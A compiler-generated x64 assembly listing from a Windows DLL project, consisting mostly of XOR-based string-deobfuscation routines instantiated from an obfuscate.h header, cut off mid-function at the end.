?pointer_to@?$pointer_traits@PEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@SAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@2@AEAU32@@Z PROC ; std::pointer_traits<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> *>::pointer_to, COMDAT

; 440  :         return _STD addressof(_Val);

	mov	rax, rcx

; 441  :     }

	ret	0
?pointer_to@?$pointer_traits@PEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@SAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@2@AEAU32@@Z ENDP ; std::pointer_traits<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> *>::pointer_to
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<24,-876194367214469683,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+24], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	mov	r9, -2
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r10d, 2
	movdqa	xmm4, XMMWORD PTR __xmm@f3d721dd83fbbdcdf3d721dd83fbbdcd
	sub	r9, r8
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	sub	r10, r8
	add	rcx, 4
	mov	rdx, -4
	sub	rdx, r8
	npad	3
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	lea	rax, QWORD PTR [rdx+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx-4]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx-4], ax
	lea	rax, QWORD PTR [r9+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx-2], ax
	mov	rax, rcx
	sub	rax, r8
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx], ax
	lea	rax, QWORD PTR [r10+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+2], ax
	add	rcx, 8
	lea	rax, QWORD PTR [rdx+rcx]
	cmp	rax, 24
	jb	$LL7@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+24], 0

; 151  : 			}
; 152  : 		}

	ret	0
$LN25@decrypt:
	mov	r9, -876194367214469683			; f3d721dd83fbbdcdH
	npad	6
$LL24@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 24
	jb	SHORT $LL24@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+24], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<24,-876194367214469683,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<24,-876194367214469683,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<24,-876194367214469683,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<13,-4924288238255343789,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+13], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN26@decrypt

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@bba969eff327f753bba969eff327f753
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN26@decrypt:
	mov	r9, -4924288238255343789		; bba969eff327f753H
$LL25@decrypt:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 13
	jb	SHORT $LL25@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+13], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<13,-4924288238255343789,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<13,-4924288238255343789,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<13,-4924288238255343789,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<14,1978695492441415517,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+14], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN26@decrypt

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@1b75bd1119a31f5d1b75bd1119a31f5d
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN26@decrypt:
	mov	r9, 1978695492441415517			; 1b75bd1119a31f5dH
$LL25@decrypt:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 14
	jb	SHORT $LL25@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+14], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<14,1978695492441415517,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<14,1978695492441415517,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<14,1978695492441415517,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<21,6311572415330896177,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+21], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	lea	rdx, QWORD PTR [rcx+4]
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r9, -2
	movdqa	xmm4, XMMWORD PTR __xmm@579735abedf3c931579735abedf3c931
	sub	r9, rcx
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	mov	r10d, 2
	sub	r10, rcx
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, WORD PTR [rdx-4]
	movq	xmm0, rax
	punpcklqdq xmm0, xmm0
	add	rax, 8
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-4], cx
	lea	rcx, QWORD PTR [r9+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-2], cx
	mov	rcx, rdx
	sub	rcx, r8
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx], cx
	lea	rcx, QWORD PTR [r10+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx+2], cx
	add	rdx, 8
	cmp	rax, 16
	jb	$LL7@decrypt

; 68   : 		for ( size_type i = 0; i < size; i++ )

	cmp	rax, 21
	jae	SHORT $LN6@decrypt
$LN25@decrypt:
	mov	r9, 6311572415330896177			; 579735abedf3c931H
	npad	7
$LL24@decrypt:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 21
	jb	SHORT $LL24@decrypt
$LN6@decrypt:

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+21], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<21,6311572415330896177,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<21,6311572415330896177,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<21,6311572415330896177,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<15,140651103900218173,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+15], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN26@decrypt

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@01f3b16f0d3d333d01f3b16f0d3d333d
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN26@decrypt:
	mov	r9, 140651103900218173			; 01f3b16f0d3d333dH
$LL25@decrypt:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 15
	jb	SHORT $LL25@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+15], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<15,140651103900218173,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<15,140651103900218173,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<15,140651103900218173,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<13,9016711428731545553,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+13], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN26@decrypt

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@7d21cb4597bfa7d17d21cb4597bfa7d1
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN26@decrypt:
	mov	r9, 9016711428731545553			; 7d21cb4597bfa7d1H
$LL25@decrypt:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 13
	jb	SHORT $LL25@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+13], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<13,9016711428731545553,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<13,9016711428731545553,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<13,9016711428731545553,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<24,-1071364949277595293,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+24], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	mov	r9, -2
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r10d, 2
	movdqa	xmm4, XMMWORD PTR __xmm@f121bf4145812963f121bf4145812963
	sub	r9, r8
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	sub	r10, r8
	add	rcx, 4
	mov	rdx, -4
	sub	rdx, r8
	npad	3
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	lea	rax, QWORD PTR [rdx+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx-4]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx-4], ax
	lea	rax, QWORD PTR [r9+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx-2], ax
	mov	rax, rcx
	sub	rax, r8
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx], ax
	lea	rax, QWORD PTR [r10+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+2], ax
	add	rcx, 8
	lea	rax, QWORD PTR [rdx+rcx]
	cmp	rax, 24
	jb	$LL7@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+24], 0

; 151  : 			}
; 152  : 		}

	ret	0
$LN25@decrypt:
	mov	r9, -1071364949277595293		; f121bf4145812963H
	npad	6
$LL24@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 24
	jb	SHORT $LL24@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+24], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<24,-1071364949277595293,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
